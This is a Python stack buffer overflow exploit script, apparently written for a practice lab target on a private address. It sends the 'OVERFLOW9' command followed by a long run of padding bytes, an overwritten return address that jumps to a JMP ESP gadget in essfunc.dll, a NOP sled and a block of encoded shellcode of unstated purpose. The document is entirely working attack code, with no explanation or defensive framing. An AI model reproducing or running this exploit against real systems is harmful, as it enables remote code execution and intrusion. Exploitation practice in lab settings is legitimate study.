import socket
import sys
import time


print("[+] Nani???? Got shell Bruh!!\n")

buff = "A" * 1514

EIP = "\x05\x12\x50\x62" # 0x62501205 JMP ESP essfunc.dll

nops = "\x90" * 16

shellcode =  b""
shellcode += b"\xbd\xc8\x95\xf1\x41\xda\xda\xd9\x74\x24\xf4"
shellcode += b"\x5f\x29\xc9\xb1\x52\x31\x6f\x12\x03\x6f\x12"
shellcode += b"\x83\x27\x69\x13\xb4\x4b\x7a\x56\x37\xb3\x7b"
shellcode += b"\x37\xb1\x56\x4a\x77\xa5\x13\xfd\x47\xad\x71"
shellcode += b"\xf2\x2c\xe3\x61\x81\x41\x2c\x86\x22\xef\x0a"
shellcode += b"\xa9\xb3\x5c\x6e\xa8\x37\x9f\xa3\x0a\x09\x50"
shellcode += b"\xb6\x4b\x4e\x8d\x3b\x19\x07\xd9\xee\x8d\x2c"
shellcode += b"\x97\x32\x26\x7e\x39\x33\xdb\x37\x38\x12\x4a"
shellcode += b"\x43\x63\xb4\x6d\x80\x1f\xfd\x75\xc5\x1a\xb7"
shellcode += b"\x0e\x3d\xd0\x46\xc6\x0f\x19\xe4\x27\xa0\xe8"
shellcode += b"\xf4\x60\x07\x13\x83\x98\x7b\xae\x94\x5f\x01"
shellcode += b"\x74\x10\x7b\xa1\xff\x82\xa7\x53\xd3\x55\x2c"
shellcode += b"\x5f\x98\x12\x6a\x7c\x1f\xf6\x01\x78\x94\xf9"
shellcode += b"\xc5\x08\xee\xdd\xc1\x51\xb4\x7c\x50\x3c\x1b"
shellcode += b"\x80\x82\x9f\xc4\x24\xc9\x32\x10\x55\x90\x5a"
shellcode += b"\xd5\x54\x2a\x9b\x71\xee\x59\xa9\xde\x44\xf5"
shellcode += b"\x81\x97\x42\x02\xe5\x8d\x33\x9c\x18\x2e\x44"
shellcode += b"\xb5\xde\x7a\x14\xad\xf7\x02\xff\x2d\xf7\xd6"
shellcode += b"\x50\x7d\x57\x89\x10\x2d\x17\x79\xf9\x27\x98"
shellcode += b"\xa6\x19\x48\x72\xcf\xb0\xb3\x15\x30\xec\xba"
shellcode += b"\x14\xd8\xef\xbc\xd7\xa2\x79\x5a\xbd\xc4\x2f"
shellcode += b"\xf5\x2a\x7c\x6a\x8d\xcb\x81\xa0\xe8\xcc\x0a"
shellcode += b"\x47\x0d\x82\xfa\x22\x1d\x73\x0b\x79\x7f\xd2"
shellcode += b"\x14\x57\x17\xb8\x87\x3c\xe7\xb7\xbb\xea\xb0"
shellcode += b"\x90\x0a\xe3\x54\x0d\x34\x5d\x4a\xcc\xa0\xa6"
shellcode += b"\xce\x0b\x11\x28\xcf\xde\x2d\x0e\xdf\x26\xad"
shellcode += b"\x0a\x8b\xf6\xf8\xc4\x65\xb1\x52\xa7\xdf\x6b"
shellcode += b"\x08\x61\xb7\xea\x62\xb2\xc1\xf2\xae\x44\x2d"
shellcode += b"\x42\x07\x11\x52\x6b\xcf\x95\x2b\x91\x6f\x59"
shellcode += b"\xe6\x11\x8f\xb8\x22\x6c\x38\x65\xa7\xcd\x25"
shellcode += b"\x96\x12\x11\x50\x15\x96\xea\xa7\x05\xd3\xef"
shellcode += b"\xec\x81\x08\x82\x7d\x64\x2e\x31\x7d\xad"

payload = buff + EIP + nops + shellcode

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Connect to the Application
s.connect(('192.168.1.117', 1337))
s.recv(1024)	#Recv the banner


#Finally the vulnerable command
s.send('OVERFLOW9 ' + payload + '\r\n')
s.send('EXIT\r\n')
s.close()
	
print("[+] Execution Finished")
